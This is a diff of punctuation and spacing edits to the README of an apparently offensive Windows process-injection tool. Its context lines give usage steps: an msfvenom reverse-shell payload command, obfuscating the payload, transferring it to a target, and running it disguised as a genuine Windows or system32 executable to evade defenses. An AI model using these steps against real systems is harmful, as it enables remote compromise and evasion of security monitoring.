@@ -14,14 +14,14 @@
 
 
 
-We have both x86 and x64 bit release as you want. **we strongly suggest x64-but release if you're bit confused about compiling manually**
+We have both x86 and x64 bit release as you want. **we strongly suggest x64-but release if you're bit confused about compiling manually.**
 
-We suggest to use directly compiled executables as in some situations it depends on your compiler.
+We suggest to use directly compiled executables as in some situations it depends on your compiler functionality .
 
 
-**If you wish to Compile x64 bit relese on Kali with cross-compiler - x86_64-w64-mingw32-gcc** 
+**If you wish to Compile x64 bit relese on Kali with cross-compiler - x86_64-w64-mingw32-gcc.** 
 
-**For 32-bit - Mingw for Windows**
+**For 32-bit - Mingw for Windows.**
 
 # Index
 
@@ -71,9 +71,12 @@ Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw
   
  ***2. Obfuscation is mainly your work to do as per your operations. The other one's? - WE'LL HANDLE!!!***
   
-  ***3. Transfer Both Payload and Binary to Target System***
+  ***3. Transfer Both Payload and Binary to Target System.***
+  
   ***4. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.
-  ***5. After Execution, Payload will be run as your specified genuine windows executable ( system32's too )***
+  
+  ***5. After Execution, Payload will be run as your specified genuine windows executable ( system32's too ).***
+  
   ***6. If you're injecting to custom binary - It might fails due to Memory allocation issue , still depends on your Privilege and many 3rd
  level factors. But you can give it a try - In some cases it will work !! :nazar_amulet:***
   
